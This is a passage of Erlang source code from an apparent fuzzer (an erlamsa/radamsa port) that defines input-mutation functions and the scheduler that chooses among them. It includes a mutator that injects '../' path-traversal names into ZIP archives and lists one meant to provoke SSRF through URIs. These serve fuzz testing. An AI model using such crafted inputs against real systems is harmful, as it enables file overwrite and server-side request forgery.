    end.

%% TODO: type for fun().
-spec edit_sublist(list(), list(), fun()) -> list().
edit_sublist(Lst, Sub, Op) ->
    lists:reverse(edit_sublist(Lst, Sub, Op, [])).

%% replace the node (sub . tail) with (op (sub . tail))
-spec edit_sublist(list(), list(), fun(), list()) -> list().
edit_sublist(Lst = [H|_T], Sub, Op, Acc) when H =:= Sub ->
    [Op(Lst)|Acc];
edit_sublist([H|T], Sub, Op, Acc) -> 
    NewH = edit_sublist(H, Sub, Op),
    edit_sublist(T, Sub, Op, [NewH|Acc]);
edit_sublist(Lst, _Sub, _Op, Acc) -> 
    [Lst|Acc].

%% TODO: type for fun().
-spec edit_sublists(list(), gb_trees:tree()) -> list().
%% lst (ff of node -> (node -> node)) -> lst' ; <- could also be done with a recursive-mapn
edit_sublists([Hd|T], OpFF) when is_list(Hd) ->     
    MaybeOp = erlamsa_utils:get(Hd, false, OpFF),
    case MaybeOp of
        false -> 
            [edit_sublists(Hd, OpFF) | edit_sublists(T, OpFF)];
        _ ->
            [MaybeOp(Hd) | edit_sublists(T, OpFF)]            
    end;
edit_sublists([H|T], OpFF) -> 
    [H | edit_sublists(T, OpFF)];
edit_sublists(Lst, _) -> Lst.

-spec partial_parse(list()) -> list().
partial_parse(Lst) -> partial_parse(Lst, []).

-spec partial_parse(list(), list()) -> list().
partial_parse([], Rout) ->
    lists:reverse(Rout);
partial_parse([H|T], Rout) ->
    CloseP = usual_delims(H),
    case CloseP of
        false ->             
            partial_parse(T, [H | Rout]);
        _ ->
            {This, Lst} = grow(T, CloseP, []),
            case Lst of 
                false -> 
                    lists:reverse(Rout) ++ [H|This];
                _ -> 
                    partial_parse(Lst, [[H|This] | Rout])
            end
    end.

% -spec flatten(list(), list()) -> list().
% flatten([], Tl) -> 
%     Tl;
% flatten([H|T], Tl) ->
%     flatten(H, flatten(T, Tl));
% flatten(Node, Tl) ->
%     [Node | Tl].

%% TODO: type for fun().
-spec sed_tree_op(fun(), atom()) -> mutation_fun().
sed_tree_op(Op, Name) ->
    fun F (Ll = [H|T], Meta) ->
        case erlamsa_utils:binarish(H) of
            true -> {F, Ll, Meta, -1};
            false -> 
                NewMeta = [{Name, 1} | Meta],
                Lst = partial_parse(binary_to_list(H)),
                Sub = pick_sublist(Lst), %% choose partially parsed node to mutate ;; fixme: not checked for F
                NewLst = edit_sublist(Lst, Sub, Op),
                {F, [erlang:iolist_to_binary(NewLst) | T], NewMeta, 1}
        end    
    end.

-spec sed_tree_dup() -> mutation_fun().
sed_tree_dup() ->
    sed_tree_op(fun (Node = [H|_T]) -> [H|Node] end, tree_dup).

-spec sed_tree_del() -> mutation_fun().
sed_tree_del() ->
    sed_tree_op(fun ([_H|T]) -> T end, tree_del).

-spec sed_tree_swap_one(list(), list()) -> list().
%% overwrite one node with one of the others
sed_tree_swap_one(Lst, Subs) ->
    ToSwap = erlamsa_rnd:reservoir_sample(Subs, 2),
    [A | [B | _]] = erlamsa_rnd:random_permutation(ToSwap),
    edit_sublist(Lst, A, fun ([_|Tl]) -> [B | Tl] end).

-spec sed_tree_swap_two(list(), list()) -> list().
%% pairwise swap of two nodes
%% TODO: here there is a bug (also in original radamsa) that causes to swap child with the parent node, could be feature xD
sed_tree_swap_two(Lst, Subs) ->
    ToSwap = erlamsa_rnd:reservoir_sample(Subs, 2),
    [A | [B | _]] = ToSwap,
    Mapping = gb_trees:enter(B, fun(_X) -> A end, gb_trees:enter(A, fun (_X) -> B end, gb_trees:empty())),    
    edit_sublists(Lst, Mapping).

%% TODO: type for fun().
-spec construct_sed_tree_swap(fun(), atom()) -> mutation_fun().
construct_sed_tree_swap(Op, Name) ->
    fun F (Ll = [H|T], Meta) ->
        case erlamsa_utils:binarish(H) of
            true -> {F, Ll, Meta, -1};
            false -> 
                Lst = partial_parse(binary_to_list(H)),
                Subs = sublists(Lst),
                N = length(Subs),
                case N < 2 of
                    true -> {F, Ll, Meta, -1};
                    false ->
                        NewLst = Op(Lst, Subs),
                        {F, [erlang:iolist_to_binary(NewLst) | T], [{Name, 1} | Meta], 1}
                end
        end
    end.

%% tree stutter
-spec repeat_path(list(), list(), non_neg_integer()) -> list().
repeat_path(Parent, _Child, N) when N < 2 ->
    Parent; %% <- causes at least 1 extra path to be made, saves one useless replace cycle
repeat_path(Parent, Child, N) ->
    %% preventing too deep lists
    case erlang:process_info(self(), memory) of
        {memory, Mem} when Mem > 256000000 ->
            Parent;
        _Else ->
            edit_sublist(Parent, Child, 
                fun ([_H|T]) -> [repeat_path(Parent, Child, N-1) | T] end)
    end.

-spec choose_child(list()) -> false | list().
choose_child(Node) ->
    Subs = sublists(Node),
    case Subs of 
        [] -> false;
        _Else -> erlamsa_rnd:rand_elem(Subs)
    end.

-spec choose_stutr_nodes(list()) -> {false | list(), false | list()}.
choose_stutr_nodes([]) -> {false, false}; %% no child nodes
choose_stutr_nodes([H|T]) ->
    Childp = choose_child(H),
    case Childp of
        false -> choose_stutr_nodes(T);
        _Else -> {H, Childp}
    end.

-spec sed_tree_stutter(list_of_bins(), meta_list()) -> mutation_res().
sed_tree_stutter(Ll = [H|T], Meta) ->
    case erlamsa_utils:binarish(H) of
        true -> {fun sed_tree_stutter/2, Ll, Meta, -1};
        false -> 
            Lst = partial_parse(binary_to_list(H)), %% (byte|node ...)
            Subs = sublists(Lst),
            RandSubs = erlamsa_rnd:random_permutation(Subs),
            {Parent, Child} = choose_stutr_nodes(RandSubs),
            N_reps = erlamsa_rnd:rand_log(10),
            case Parent of 
                false -> {fun sed_tree_stutter/2, Ll, Meta, -1};
                _Else ->
                    NewLst = edit_sublist(Lst, Child, 
                            fun ([_H|Tl]) -> [repeat_path(Parent, Child, N_reps)|Tl] end),
                    {fun sed_tree_stutter/2, 
                        [erlang:iolist_to_binary(NewLst) | T], 
                        [{tree_stutter, 1} | Meta], 1}
            end
    end.

%%
%% UTF-8
%%

%% grab low 6 bits of a number
-spec ext(integer()) -> integer().
ext(N) ->
    (N band 2#111111) bor 2#10000000.
    
-spec encode_point(integer()) -> [integer()].
%% encode an ascii to utf-8
encode_point(Point) when Point < 16#80 ->                    % ascii, fits 7 bits 
    [Point];
encode_point(Point) when Point < 2#100000000000 ->           % 5 + 6 bits
    [16#c0 bor (16#1f band (Point bsr 6)),
    ext(Point)];
encode_point(Point) when Point < 2#10000000000000000 ->      % 4 + 2*6 bits
    [16#e0 bor (16#0f band (Point bsr 12)),
    ext(Point bsr 6),
    ext(Point)];
encode_point(Point) when Point < 2#1000000000000000000000 -> % 3 + 3*6 bits
    [16#f0 bor (2#111 band (Point bsr 18)),
    ext(Point bsr 12),
    ext(Point bsr 6),
    ext(Point)].

-spec funny_unicode() -> list().
%% TODO: VERY INEFFECTIVE, should be constant...
funny_unicode() -> 
    Manual =   [[239, 191, 191],        % 65535
                [240, 144, 128, 128],   % 65536
                [16#ef, 16#bb, 16#bf],  % the canonical utf8 bom
                [16#fe, 16#ff],         % utf16 be bom
                [16#ff, 16#fe],         % utf16 le bom
                [0, 0, 16#ff, 16#ff],   % ascii null be
                [16#ff, 16#ff, 0, 0],   % ascii null le
                [43, 47, 118, 56],      % and some others from wikipedia
                [43,47,118,57],[43,47,118,43],[43,47,118,47],
                [247,100,76],[221,115,102,115],[14,254,255],[251,238,40],
                [251,238,40,255],[132,49,149,51]],
    Codes =     [[16#0009,16#000d],16#00a0,16#1680,16#180e,
                [16#2000,16#200a],16#2028,16#2029,16#202f,16#205f,
                16#3000,[16#200e,16#200f],[16#202a,16#202e],
                [16#200c,16#200d],16#0345,16#00b7,[16#02d0,16#02d1],
                16#ff70,[16#02b0,16#02b8],16#fdd0,16#034f,
                [16#115f,16#1160],[16#2065,16#2069],16#3164,16#ffa0,
                16#e0001,[16#e0020,16#e007f],
                [16#0e40,16#0e44],16#1f4a9],
    Numbers = lists:foldl(
                fun 
                    ([X,Y], Acc) -> lists:seq(X,Y) ++ Acc; 
                    (X, Acc) -> [X|Acc] 
                end, [], Codes), 
    Manual ++ [encode_point(X) || X <- Numbers].

-spec sed_utf8_widen(list_of_bins(), meta_list()) -> mutation_res().
sed_utf8_widen([H|T], Meta) -> 
    P = erlamsa_rnd:rand(size(H)),
    D = erlamsa_rnd:rand_delta(),
    {fun sed_utf8_widen/2, 
     [edit_byte_vector(H, P, 
        fun (B) when B =:= B band 2#111111 -> N = B bor 2#10000000, <<2#11000000:8, N:8>>;
            (B) -> <<B:8>>
        end)
      | T], [{sed_utf8_widen, D}|Meta], D}.

-spec sed_utf8_insert(list_of_bins(), meta_list()) -> mutation_res().
sed_utf8_insert([H|T], Meta) ->  
    P = erlamsa_rnd:rand(size(H)),
    D = erlamsa_rnd:rand_delta(),
    Bin = list_to_binary(erlamsa_rnd:rand_elem(funny_unicode())),
    {fun sed_utf8_insert/2, 
     [edit_byte_vector(H, P, 
        fun (B) -> <<B:8, Bin/binary>> end)
      | T], [{sed_utf8_insert, D}|Meta], D}.

%% Null debug mutator -- passes data "as is" -- for testing

-spec nomutation(list_of_bins(), meta_list()) -> mutation_res().
nomutation(Ll, Meta) ->    
    {fun nomutation/2, Ll, [{nomutation, -1}|Meta], -1}.

%%
%% Length predict mutations -- trying to mutate len
%%

%% TODO: correct spec
%%-spec mutate_length(binary()) -> {integer(), binary()}.
mutate_length(Binary, []) -> {-2, Binary};
mutate_length(Binary, _Elem = {ok, Size, Endianness, Len, A, _B}) ->
    Am8 = A * 8, Len8 = Len * 8,
    {H, Len, Blob, Rest} = erlamsa_field_predict:extract_blob(Endianness, Binary, Am8, Size, Len8),
    <<TmpNewLen:Size>> = erlamsa_rnd:random_block(trunc(Size/8)),
    NewLen = min(?ABSMAX_BINARY_BLOCK, TmpNewLen*2),
    Result = 
        case erlamsa_rnd:rand(7) of
            %% set len field = 0
            0 -> <<H:Am8, 0:Size, Blob:Len8, Rest/binary>>;  
            %% set len field = 0xFF..FF
            1 -> <<H:Am8, -1:Size, Blob:Len8, Rest/binary>>;
            %% expand blob field with random data 
            2 -> 
                RndBlock = erlamsa_rnd:fast_pseudorandom_block(NewLen),
                TmpBin = erlamsa_field_predict:rebuild_blob(Endianness, H, Am8, Len, Size, Blob, Len8, RndBlock),
                <<TmpBin/binary, Rest/binary>>;
            %% drop blob field
            3 ->
                erlamsa_field_predict:rebuild_blob(Endianness, H, Am8, NewLen, Size, 0, 0, Rest);
            %% set len field = random bytes(..)
            _Else -> 
                erlamsa_field_predict:rebuild_blob(Endianness, H, Am8, NewLen, Size, Blob, Len8, Rest)                
        end,
    {+1, Result}.

-spec length_predict(list_of_bins(), meta_list()) -> mutation_res().
length_predict([H|T], Meta) ->
    Elem = erlamsa_rnd:rand_elem(erlamsa_field_predict:get_possible_simple_lens(H)),
    {D, Bin} = mutate_length(H, Elem),  
    {fun length_predict/2, [Bin|T], [{muta_len, D}|Meta], D}.

%%
%% ZIP Path traversal
%%

mutate_zip_path(FileName, I, B, Acc) -> 
    R = erlamsa_rnd:rand(20),
    NewFileName = lists:flatten([ "../" || _A <- lists:seq(1,R)] ++ FileName),
    [{NewFileName, B(), I()} | Acc].

-spec zip_path_traversal(list_of_bins(), meta_list()) -> mutation_res().
zip_path_traversal([H|T], Meta) ->
    Name = "inmemory.zip",
    case zip:foldl(fun mutate_zip_path/4, [], {Name, H}) of
        {ok, FileSpec} -> 
            {ok, {Name, Bin}} = zip:create(Name, lists:reverse(FileSpec), [memory]),
            {fun zip_path_traversal/2, [Bin|T], [{muta_zippath, +1}|Meta], +1};
        _Else -> 
            {fun zip_path_traversal/2, [H|T], [{muta_zippath, -1}|Meta], -1}
    end.

%%
%%  Main Mutation Functions
%%

-spec adjust_priority(non_neg_integer(), non_neg_integer()) -> non_neg_integer().
%% limit to [min-score .. max-score]
adjust_priority(Pri, 0) -> Pri;
adjust_priority(Pri, Delta) ->
    max(?MIN_SCORE, min(?MAX_SCORE, Pri + Delta)).

-spec weighted_permutations([mutation()]) -> [mutation()]. 
%% [{Score, Priority, _, _}, ...] -> [{Rand(S*P), {...}}, ...] -> sort -> [{...}, ...]
weighted_permutations([]) -> [];
weighted_permutations(Pris) ->
    PPris = lists:map(fun (X = {S, P, _, _}) -> {erlamsa_rnd:rand(trunc(S*P)), X} end, Pris),
    SPPris = lists:sort(fun ({A,_},{B,_}) -> A>=B end, PPris),
    [ X || {_, X} <- SPPris].

%% Mutators have a score they can change themselves (1-100) and a priority given by
%% the user at command line. Activation probability is (score*priority)/SUM(total-scores).

%%TODO: decribe fun() type
-spec mux_fuzzers([mutation()]) -> fun().
%% (#(score priority mutafn name) ...) -> merged-mutafn :: rs ll meta -> merged-mutafn' rs' ll' meta'
mux_fuzzers(Fs) ->
    fun 
        L([<<>>],   Meta) -> {mux_fuzzers(Fs), [<<>>], Meta}; %% TODO: if some mutation goes wrong, these could be infinite loop; redesign in future
        L([],   Meta) -> {mux_fuzzers(Fs), <<>>, Meta};
        L(Ll,   Meta) when is_list(Ll) ->
            mux_fuzzers_loop(Ll, weighted_permutations(Fs), [], Meta);
        L(Ll,   Meta) when is_function(Ll) -> L(Ll(), Meta) %% TODO: strange behaviour
    end.

-spec mux_fuzzers_loop(lazy_list_of_bins(), [mutation()], [mutation()], meta_list()) -> {fun(), lazy_list_of_bins(), meta_list()}.
mux_fuzzers_loop(Ll, [], Out, Meta) -> {mux_fuzzers(Out), Ll, Meta};
mux_fuzzers_loop(Ll = [H|_T], [_Node|Tail], Out, Meta) when is_binary(H), byte_size(H) > ?ABSMAX_BINARY_BLOCK ->
    {mux_fuzzers(Out ++ Tail), Ll, [{skipped_big, byte_size(H)} | Meta]};
mux_fuzzers_loop(Ll, [Node|Tail], Out, Meta) ->
    {Mscore, MPri, Fn, Mname} = Node,
    Res = Fn(Ll, Meta),
    {MFn, Mll, MMeta, Delta} = Res, %% in radamsa (mfn rs mll mmeta delta) = Fn(...), that strange, TODO: check it    
    NOut = [{adjust_priority(Mscore, Delta), MPri, MFn, Mname} | Out], %% in radamsa mfn instead of fn
    IsMll = is_list(Mll),
    if
        IsMll andalso (hd(Mll) == hd(Ll)) -> mux_fuzzers_loop(Ll, Tail, NOut, [{failed, Mname} | MMeta]);
        true -> {mux_fuzzers(NOut ++ Tail), Mll, [{used, Mname} | MMeta]}
    end.


-spec mutations() -> [mutation()].
%% default mutations list 
mutations() ->         
    mutations([]).

-spec mutations([mutation()]) -> [mutation()].
%% default mutations list + external mutas
mutations(CustomMutas) ->         
                       [{?MAX_SCORE, 10, fun erlamsa_sgml:sgml_mutate/2, sgm, "SGML tree mutations"},
                        {?MAX_SCORE, 2, fun erlamsa_json:json_mutate/2, js, "JSON tree mutations"},
                        {?MAX_SCORE, 1, fun sed_utf8_widen/2, uw, "try to make a code point too wide"},
                        {?MAX_SCORE, 2, fun sed_utf8_insert/2, ui, "insert funny unicode"},
                        {?MAX_SCORE, 1, construct_ascii_bad_mutator(), ab, "enhance silly issues in ASCII string data handling"},
                        {?MAX_SCORE, 1, construct_ascii_delimeter_mutator(), ad, "play with delimeters in ASCII string data"},
                        {?MAX_SCORE, 1, sed_tree_dup(), tr2, "duplicate a node"},
                        {?MAX_SCORE, 1, sed_tree_del(), td, "delete a node"},
                        {?MAX_SCORE, 2, fun sed_num/2, num, "try to modify a textual number"},                        
                        {?MAX_SCORE, 2, construct_sed_tree_swap(fun sed_tree_swap_one/2, tree_swap_one), ts1, "swap one node with another one"},
                        {?MAX_SCORE, 2, fun sed_tree_stutter/2, tr, "repeat a path of the parse tree"},
                        {?MAX_SCORE, 2, construct_sed_tree_swap(fun sed_tree_swap_two/2, tree_swap_two), ts2, "swap two nodes pairwise"},
                        {?MAX_SCORE, 1, construct_sed_byte_drop(), bd, "drop a byte"},
                        {?MAX_SCORE, 1, construct_sed_byte_inc(), bei, "increment a byte by one"},
                        {?MAX_SCORE, 1, construct_sed_byte_dec(), bed, "decrement a byte by one"},
                        {?MAX_SCORE, 1, construct_sed_byte_flip(), bf, "flip one bit"},
                        {?MAX_SCORE, 1, construct_sed_byte_insert(), bi, "insert a byte"},
                        {?MAX_SCORE, 1, construct_sed_byte_random(), ber, "swap a byte with random one"},
                        {?MAX_SCORE, 1, construct_sed_byte_repeat(), br, "repeat a byte"},
                        {?MAX_SCORE, 1, construct_sed_bytes_perm(), sp, "permute a sequence of bytes"},
                        {?MAX_SCORE, 1, construct_sed_bytes_repeat(), sr, "repeat a sequence of bytes"},                        
                        {?MAX_SCORE, 1, construct_sed_bytes_drop(), sd, "delete a sequence of bytes"},
                        {?MAX_SCORE, 1, construct_sed_bytes_randmask([fun mask_nand/1, fun mask_or/1, fun mask_xor/1]), snand, "NAND/OR/XOR random bytes from block with 2^random values"},
                        {?MAX_SCORE, 1, construct_sed_bytes_randmask([fun mask_replace/1]), srnd, "replace random bytes from block with random values"},                        
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_del/2, line_del), ld, "delete a line"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_del_seq/2, line_del_seq), lds, "delete many lines"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_dup/2, line_dup), lr2, "duplicate a line"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_clone/2, line_clone), lri, "copy a line closeby"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_repeat/2, line_repeat), lr, "repeat a line"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_swap/2, line_swap), ls, "swap two lines"},
                        {?MAX_SCORE, 1, construct_line_muta(fun erlamsa_generic:list_perm/2, line_perm), lp, "swap order of lines"},
                        {?MAX_SCORE, 1, construct_st_line_muta(fun erlamsa_generic:st_list_ins/2, list_ins, [0]), lis, "insert a line from elsewhere"},
                        {?MAX_SCORE, 1, construct_st_line_muta(fun erlamsa_generic:st_list_replace/2, list_replace, [0]), lrs, "replace a line with one from elsewhere"},
                        {?MAX_SCORE, 2, fun sed_fuse_this/2, ft, "jump to a similar position in block"},
                        {?MAX_SCORE, 1, fun sed_fuse_next/2, fn, "likely clone data between similar positions"},
                        {?MAX_SCORE, 2, fun sed_fuse_old/2, fo, "fuse previously seen data elsewhere"},
                        {?MAX_SCORE, 2, fun length_predict/2, len, "predicted length mutation"},
                        {?MAX_SCORE, 2, fun base64_mutator/2, b64, "try mutate base64-encoded block"},
                        {?MAX_SCORE, 1, fun uri_mutator/2, uri, "try mutate URI to cause SSRF"},
                        {?MAX_SCORE, 1, fun zip_path_traversal/2, zip, "ZIP path traversal"},
                        {?MAX_SCORE, 0, fun nomutation/2, nil, "no mutation will occur (debugging purposes)"}
                        |CustomMutas].

%% convert mutas list to standalone format     
%% {Max_Score, Pri, F, Name, Desc} -> {Score, Val, F, Name}                    
-spec mutas_list(list()) -> [mutation()].
mutas_list(Lst) ->
    lists:map(fun({Score, Pri, F, Name, _Desc}) -> {Score, Pri, F, Name} end, Lst).

%% JSON/XML inner mutations
-spec inner_mutations_list() -> [atom()].
inner_mutations_list() -> [ab, ad, ber, b64, ld, lp, lri, lr, num, sd, srnd, sxor, uri, zip].

-spec inner_mutations() -> [mutation()].
inner_mutations() ->        
                    InnerMutationsMap = maps:from_list(lists:map(fun (A) -> {A, ok} end, inner_mutations_list())),
                    lists:foldl(
                        fun({Sc, Pri, Fun, Name, _Desc}, Acc) ->
                            case maps:get(Name, InnerMutationsMap, no) of
                                ok -> [{Sc, Pri, Fun, Name}|Acc];
                                no -> Acc
                            end
                        end,
                    [], mutations([])).

-spec default(list()) -> [{atom(), non_neg_integer()}].
default(CustomMutas) -> [{Name, Pri} || {_, Pri, _, Name, _Desc} <- mutations(CustomMutas)].

-spec tostring(list()) -> string().
tostring(Lst) -> 
    lists:foldl(fun ({_, Pri, _, Name, _Desc}, Acc) -> 
        case Pri of
            1 -> atom_to_list(Name) ++ "," ++ Acc;
            _Else -> atom_to_list(Name) ++ "=" ++ integer_to_list(Pri) ++ "," ++ Acc
        end
    end, [], Lst).

-spec make_mutator([{atom(), non_neg_integer()}], list()) -> fun().
make_mutator(Lst, CustomMutas) ->
    SelectedMutas = maps:from_list(Lst),
    Mutas = lists:foldl(
        fun ({Score, _Pri, F, Name, _Desc}, Acc) ->
            Val = maps:get(Name, SelectedMutas, notfound),
            case Val of 
                notfound -> Acc;
                _Else -> [{Score, Val, F, Name} | Acc]
            end
        end,
        [],
        mutations(CustomMutas)),  
    mutators_mutator(Mutas).

-spec mutators_mutator([mutation()]) -> fun().
%% randomize mutator scores
mutators_mutator(Mutas) ->
    mutators_mutator(Mutas, []).

-spec mutators_mutator([mutation()], [mutation()]) -> fun().
mutators_mutator([], Out) ->
    mux_fuzzers(Out);
mutators_mutator([{_, Pri, F, Name}|T], Out) ->
    N = erlamsa_rnd:rand(trunc(?MAX_SCORE)),
    mutators_mutator(T, [{max(2, N), Pri, F, Name} | Out]).


